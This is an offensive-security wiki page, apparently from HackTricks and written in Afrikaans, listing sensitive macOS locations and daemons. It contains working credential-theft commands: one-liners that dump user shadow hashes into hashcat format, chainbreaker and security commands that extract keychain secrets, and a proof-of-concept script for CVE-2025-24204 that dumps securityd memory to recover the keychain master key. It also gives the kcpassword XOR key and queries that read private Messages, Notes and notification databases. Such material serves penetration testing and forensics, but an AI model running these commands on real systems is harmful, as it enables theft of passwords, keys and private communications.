# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}


## Wagwoorde

### Shadow Passwords

Shadow password word saam met die gebruiker se konfigurasie gestoor in plists wat in **`/var/db/dslocal/nodes/Default/users/`** geleë is.\
Die volgende one-liner kan gebruik word om **al die inligting oor die gebruikers** (insluitend hash-inligting) te dump:

```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```

[**Skripte soos hierdie een**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) of [**hierdie een**](https://github.com/octomagon/davegrohl.git) kan gebruik word om die hash na **hashcat** **formaat** om te skakel.

’n Alternatiewe one-liner wat creds van alle nie-diensrekeninge in hashcat-formaat `-m 7100` sal dump (macOS PBKDF2-SHA512):

```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

Nog ’n manier om ’n gebruiker se `ShadowHashData` te bekom, is deur `dscl` te gebruik: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

#### Skakel gekopieerde ShadowHashData op Linux om

As die eienskap na ’n Linux-cracking-gasheer gekopieer is, stoor **slegs die heksadesimale grepe** (nie die `ShadowHashData:`-etiket nie) in `shadowhash.hex`. Op Ubuntu skakel `libplist-utils` die gedekodeerde binêre plist na leesbare XML om sonder macOS se `plutil`.<sup>[[5]](#references)</sup>

```bash
sudo apt install libplist-utils
xxd -r -p shadowhash.hex > shadowhash.bplist
plistutil -i shadowhash.bplist -o shadowhash.xml -f xml1
```

Gebruik in die XML `iterations` en die base64-waardes van `salt` en `entropy` uit **`SALTED-SHA512-PBKDF2`**, nie die afsonderlike SRP-verifieerder nie. Stel `salt_b64` en `entropy_b64` op die inhoud van hul onderskeie XML-`<data>`-elemente. Dekodeer dit na hex en vorm een reël soos `$ml$<iterations>$<salt_hex>$<entropy_hex>` vir Hashcat-modus `7100`. Dit is vanlyn raaiwerk ná bevoorregte verkryging van die hash, nie ’n metode vir initial-access of privilege-escalation nie.<sup>[[5]](#references)[[6]](#references)</sup>

```bash
printf '%s' "$salt_b64" | base64 -d | xxd -p -c 2000
printf '%s' "$entropy_b64" | base64 -d | xxd -p -c 2000
```

### /etc/master.passwd

Hierdie lêer word **slegs gebruik** wanneer die stelsel in **enkelgebruikermodus** loop (dus nie baie gereeld nie).

### Keychain Dump

Let daarop dat wanneer die security-binêre gebruik word om die wagwoorde in gedekripteerde vorm te **dump**, verskeie aanwysings die gebruiker sal vra om hierdie bewerking toe te laat.

```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```

Op moderne macOS is die interessantste ondersteunende bergings gewoonlik **`~/Library/Keychains/login.keychain-db`** en **`/Library/Keychains/System.keychain`**. Dit is SQLite-backed lêers, maar toegang tot plaintext word steeds deur **`securityd`** bemiddel: as jy die rou DB steel, kry jy hoofsaaklik metadata en geënkripteerde blobs, tensy jy ook die gebruiker se wagwoord, `SystemKey` of ’n master key in die geheue herwin.<sup>[[2]](#references)</sup>

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Gebaseer op hierdie kommentaar [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760), lyk dit of hierdie nutsgoed nie meer in Big Sur werk nie.

### Keychaindump-oorsig

’n Nutsmiddel met die naam **keychaindump** is ontwikkel om wagwoorde uit macOS-keychains te onttrek, maar dit het beperkings op nuwer macOS-weergawes soos Big Sur, soos aangedui in ’n [bespreking](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Die gebruik van **keychaindump** vereis dat die aanvaller toegang verkry en voorregte eskaleer tot **root**. Die nutsmiddel buit die feit uit dat die keychain by verstek ontsluit word wanneer die gebruiker aanmeld, sodat toepassings toegang daartoe kan kry sonder om die gebruiker se wagwoord herhaaldelik te vereis. As ’n gebruiker egter kies om sy of haar keychain ná elke gebruik te sluit, is **keychaindump** ondoeltreffend.

**Keychaindump** werk deur ’n spesifieke proses genaamd **securityd** te teiken, wat Apple beskryf as ’n daemon vir magtiging en kriptografiese bewerkings, en wat noodsaaklik is vir toegang tot die keychain. Die onttrekkingsproses behels die identifisering van ’n **Master Key** wat van die gebruiker se aanmeldwagwoord afgelei is. Hierdie sleutel is noodsaaklik om die keychain-lêer te lees. Om die **Master Key** op te spoor, skandeer **keychaindump** die geheue-heap van **securityd** met die `vmmap`-opdrag en soek na moontlike sleutels in areas wat as `MALLOC_TINY` gemerk is. Die volgende opdrag word gebruik om hierdie geheue-liggings te ondersoek:

```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```

Nadat potensiële master keys geïdentifiseer is, soek **keychaindump** deur die heaps na ’n spesifieke patroon (`0x0000000000000018`) wat ’n kandidaat vir die master key aandui. Verdere stappe, insluitend deobfuscation, is nodig om hierdie key te gebruik, soos in **keychaindump** se bronkode uiteengesit word. Ontleders wat op hierdie gebied fokus, moet daarop let dat die kritieke data vir die dekripsie van die keychain in die geheue van die **securityd**-proses gestoor word. ’n Voorbeeldopdrag om **keychaindump** uit te voer, is:

```bash
sudo ./keychaindump
```

### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kan die volgende tipes inligting op ’n forensies betroubare manier uit ’n macOS-keychain onttrek:

- Gehashte keychain-wagwoord, geskik om met [hashcat](https://hashcat.net/hashcat/) of [John the Ripper](https://www.openwall.com/john/) te kraak
- Internet-wagwoorde
- Generiese wagwoorde
- Private sleutels
- Publieke sleutels
- X509-sertifikate
- Secure Notes
- Appleshare-wagwoorde

As die keychain-ontsluitwagwoord, ’n meestersleutel wat met [volafox](https://github.com/n0fate/volafox) of [volatility](https://github.com/volatilityfoundation/volatility) verkry is, of ’n ontsluitlêer soos SystemKey gegee word, sal Chainbreaker ook wagwoorde in gewone teks verskaf.

Sonder een van hierdie metodes om die Keychain te ontsluit, sal Chainbreaker alle ander beskikbare inligting vertoon.

#### **Stort keychain-sleutels**

```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

#### **Dump keychain-sleutels (met wagwoorde) met SystemKey**

```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain-sleutels (met wagwoorde) deur die hash te kraak**

```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain-sleutels (met wagwoorde) met memory dump**

[Volg hierdie stappe](../index.html#dumping-memory-with-osxpmem) om ’n **memory dump** uit te voer.

```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unfortunately, Volafox does not support recent macOS versions
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```

#### **Dump keychain-sleutels (met wagwoorde) met die gebruiker se wagwoord**

As jy die gebruiker se wagwoord ken, kan jy dit gebruik om keychains wat aan die gebruiker behoort te dump en te dekripteer.

```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

### Keychain master key via `gcore` entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) is met `/usr/bin/gcore` wat die **`com.apple.system-task-ports.read`** entitlement bevat, vrygestel. Dit het beteken dat enige plaaslike admin (of kwaadwillige ondertekende app) **enige prosesgeheue kon dump, selfs wanneer SIP/TCC afgedwing is**. Deur `securityd` te dump, word die **Keychain master key** in clear uitgelek, en kan jy `login.keychain-db` sonder die gebruiker se wagwoord dekripteer.<sup>[[1]](#references)</sup>

**Vinnige reproduksie op kwesbare builds (15.0–15.2):**

```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
        c=m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Voer die onttrekte heks-sleutel aan Chainbreaker (`--key <hex>`) om die login-sleutelbos te dekripteer. Apple het die entitlement in **macOS 15.3+** verwyder, so dit werk net op ongepatchte Sequoia-bouweergawes of stelsels wat die kwesbare binary behou het.

### kcpassword

Die **kcpassword**-lêer bevat die **gebruiker se login-wagwoord**, maar slegs as die stelseleienaar **outomatiese login geaktiveer het**. Die gebruiker sal dus outomaties aangemeld word sonder om vir ’n wagwoord gevra te word (wat nie baie veilig is nie).

Die wagwoord word in die lêer **`/etc/kcpassword`** gestoor, XORed met die sleutel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. As die gebruiker se wagwoord langer as die sleutel is, word die sleutel hergebruik.\
Dit maak die wagwoord redelik maklik om te herwin, byvoorbeeld met scripts soos [**hierdie een**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interessante inligting in databasisse

### Messages

```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Kennisgewings

Voor **Sequoia** kan jy die Notification Center-winkel gewoonlik vind by **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. In **Sequoia+** het Apple dit na die TCC-beskermde groepcontainer **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`** verskuif.

Die meeste interessante inligting word in **blob**-kolomme gestoor, dus sal jy daardie inhoud moet onttrek en na iets mensleesbaars omskakel (`plutil -p -`, `strings` of ’n klein parser). Vinnige triage-voorbeelde:

```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```

#### Onlangse privaatheidskwessies (NotificationCenter DB)

- In macOS **14.7–15.1** het Apple banierinhoud in die SQLite-lêer `db2/db` gestoor sonder behoorlike redaksie. CVE's **CVE-2024-44292/44293/40838/54504** het enige plaaslike gebruiker toegelaat om ander gebruikers se kennisgewingteks te lees deur bloot die DB oop te maak (geen TCC-aanvraag nie).<sup>[[3]](#references)</sup>
- Apple het dit versag deur die DB na `group.com.apple.usernoted` te verskuif en dit op nuwer Sequoia-weergawes met TCC te beskerm. Op huidige stelsels het jy dus gewoonlik die regte gebruikerskonteks of 'n TCC-omseiling nodig om dit te lees.<sup>[[4]](#references)</sup>
- Op ouer eindpunte, kopieer die lêers `db`, `db-wal` en `db-shm` saam voordat jy opdateer of herlaai as jy die artefakte wil behou.

### Notas

Die gebruiker se **notas** kan gevind word in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```

As die eenreël-opdrag hierbo te veel geraas veroorsaak, voer `ZICNOTEDATA.ZDATA` uit, dekomprimeer dit met gunzip en ontleed die protobuf: dit is gewoonlik betroubaarder as om `strings` direk op die SQLite-lêer uit te voer.

### Agtergrondtake / Aanmelditems

Sedert **Ventura** word gebruiker-goedgekeurde aanmelditems en verskeie agtergrondtake nagespoor in **BTM**-winkels, soos **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** en die weergawebeheerde stelselkas **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Hierdie lêers is nuttig om vinnig persistence, hulpgereedskap en sommige MDM-bestuurde agtergronditems te identifiseer:

```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```

Vir die persistence-hoek en BTM-internals, kyk na [die bladsy oor outomatiese begin-liggings](../../macos-auto-start-locations.md#login-items) en [die notas oor Background Tasks Management](../macos-security-protections/README.md#background-tasks-management).

## Voorkeure

In macOS-toepassings is voorkeure in **`$HOME/Library/Preferences`** geleë, en in iOS is dit in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

In macOS kan die CLI-instrument **`defaults`** gebruik word om die **Preferences-lêer te wysig**.

**`/usr/sbin/cfprefsd`** bied die XPC-dienste `com.apple.cfprefsd.daemon` en `com.apple.cfprefsd.agent` aan, en kan opgeroep word om aksies soos die wysiging van voorkeure uit te voer.

## OpenDirectory permissions.plist

Die lêer `/System/Library/OpenDirectory/permissions.plist` bevat toestemmings wat op noduskenmerke toegepas word en word deur SIP beskerm.\
Hierdie lêer verleen toestemmings aan spesifieke gebruikers volgens UUID (en nie uid nie), sodat hulle toegang tot spesifieke sensitiewe inligting soos `ShadowHashData`, `HeimdalSRPKey` en `KerberosKeys` kan verkry, onder andere:

```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
	<key>dsAttrTypeNative:ShadowHashData</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
	<key>dsAttrTypeNative:KerberosKeys</key>
	<array>
		<dict>
			<!-- allow wheel even though it's implicit -->
			<key>uuid</key>
			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
			<key>permissions</key>
			<array>
				<string>readattr</string>
				<string>writeattr</string>
			</array>
		</dict>
	</array>
[...]
```

## Stelselkennisgewings

### Darwin-kennisgewings

Die hoofdemon vir kennisgewings is **`/usr/sbin/notifyd`**. Om kennisgewings te ontvang, moet kliënte deur die `com.apple.system.notification_center` Mach-poort registreer (kontroleer dit met `sudo lsmp -p <pid notifyd>`). Die demoon kan met die lêer `/etc/notify.conf` gekonfigureer word.

Die name wat vir kennisgewings gebruik word, is unieke omgekeerde DNS-notasies. Wanneer ’n kennisgewing na een van hulle gestuur word, ontvang die kliënt(e) wat aangedui het dat hulle dit kan hanteer, dit.

Dit is moontlik om die huidige status te stort (en al die name te sien) deur die sein SIGUSR2 na die notifyd-proses te stuur en die gegenereerde lêer te lees: `/var/run/notifyd_<pid>.status`:

```bash
ps -ef | grep -i notifyd
    0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
  memory: com.apple.system.timezone
  common: com.apple.analyticsd.running
  common: com.apple.CFPreferences._domainsChangedExternally
  common: com.apple.security.octagon.joined-with-bottle
[...]
```

### Distributed Notification Center

Die **Distributed Notification Center**, waarvan die hoofbinêre lêer **`/usr/sbin/distnoted`** is, is nog ’n manier om kennisgewings te stuur. Dit stel sommige XPC-dienste bloot en voer ’n paar kontroles uit om kliënte te probeer verifieer.

### Apple Push Notifications (APN)

In hierdie geval kan toepassings vir **topics** registreer. Die kliënt genereer ’n token deur met Apple se bedieners via **`apsd`** te kommunikeer.\
Verskaffers het ook ’n token gegenereer en kan met Apple se bedieners koppel om boodskappe aan die kliënte te stuur. **`apsd`** ontvang hierdie boodskappe plaaslik en stuur die kennisgewing aan die toepassing oor wat daarvoor wag.

Die voorkeure is in `/Library/Preferences/com.apple.apsd.plist` geleë.

Daar is ’n plaaslike databasis van boodskappe in macOS by `/Library/Application\ Support/ApplePushService/aps.db` en in iOS by `/var/mobile/Library/ApplePushService`. Dit het 3 tabelle: `incoming_messages`, `outgoing_messages` en `channel`.

```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```

Dit is ook moontlik om inligting oor die daemon en verbindings te verkry deur:

```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

## Gebruikerskennisgewings

Dit is kennisgewings wat die gebruiker op die skerm moet sien:

- **`CFUserNotification`**: Hierdie API bied ’n manier om ’n opspringvenster met ’n boodskap op die skerm te wys.
- **The Bulletin Board**: Dit wys in iOS ’n banier wat verdwyn en in die Notification Center gestoor word.
- **`NSUserNotificationCenter`**: Die verouderde kennisgewingsentrumdiens op macOS. Op ouer weergawes is die databasis gewoonlik hier: `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; op Sequoia en later is dit verskuif na `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## References

- [1] [HelpNetSecurity – macOS gcore-reg het onttrekking van die Keychain-hoofsleutel toegelaat (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [2] [Apple Platform Security – Beskerming van Keychain-data](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- [3] [Rapid7 – Bekendmaking van Notification Center SQLite-data (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [4] [9to5Mac – Apple spreek kommer oor privaatheid rondom Notification Center-databasis in macOS Sequoia aan](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)
- [5] [SRA Labs – macOS-wagwoordkraking](https://labs.sra.io/posts/macospasswordcracking)
- [6] [Hashcat-voorbeeldhashes – macOS v10.8+ (PBKDF2-SHA512)](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../../banners/hacktricks-training.md}}
